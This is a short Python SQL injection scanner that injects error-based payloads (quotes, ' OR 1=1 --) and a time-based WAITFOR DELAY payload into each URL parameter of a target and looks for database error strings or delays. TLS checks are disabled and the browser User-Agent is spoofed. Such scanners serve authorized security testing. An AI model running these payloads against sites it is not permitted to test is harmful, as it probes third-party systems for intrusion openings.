import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
}


error_payloads = ["'", "\"", "'--", "\"--", "' OR 1=1 --", "\" OR 1=1 --"]
time_based_payload = "'; WAITFOR DELAY '0:0:5' --"


sql_errors = [
    "you have an error in your sql syntax;",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax error",
    "mysql_fetch",
    "Warning: mysql_",
    "ORA-01756"
]

def inject_get(url):
    print(f"\n[+] Testing URL: {url}")
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    for param in query:
        for payload in error_payloads:
            tampered = query.copy()
            tampered[param] = tampered[param][0] + payload
            new_query = urlencode(tampered, doseq=True)
            new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

            try:
                r = requests.get(new_url, timeout=5, verify=False, headers=headers)  # headers added here
                for error in sql_errors:
                    if error.lower() in r.text.lower():
                        print(f"[!] SQLi vulnerability found at: {new_url}")
                        print(f"    Error: {error}")
                        return
            except Exception as e:
                print(f"[-] Request faileed: {e}")

    
    print("[*] Testing blind SQLi (time delay)...")
    tampered = query.copy()
    for param in tampered:
        tampered[param] = tampered[param][0] + time_based_payload
        new_query = urlencode(tampered, doseq=True)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

        try:
            start = time.time()
            requests.get(new_url, timeout=10, verify=False, headers=headers)  # headers added here too
            end = time.time()

            if end - start > 4.5:
                print(f"[!] Possible Blind SQL Injection at: {new_url}")
                return
        except Exception as e:
            print(f"[-] Blind check failed: {e}")

    print("[-] No SQL Injection vulnerabilities found.")


if len(sys.argv) < 2:
    print("Usage: python sqli_scanner.py <target_url>")
    sys.exit(1)

target = sys.argv[1]
inject_get(target)
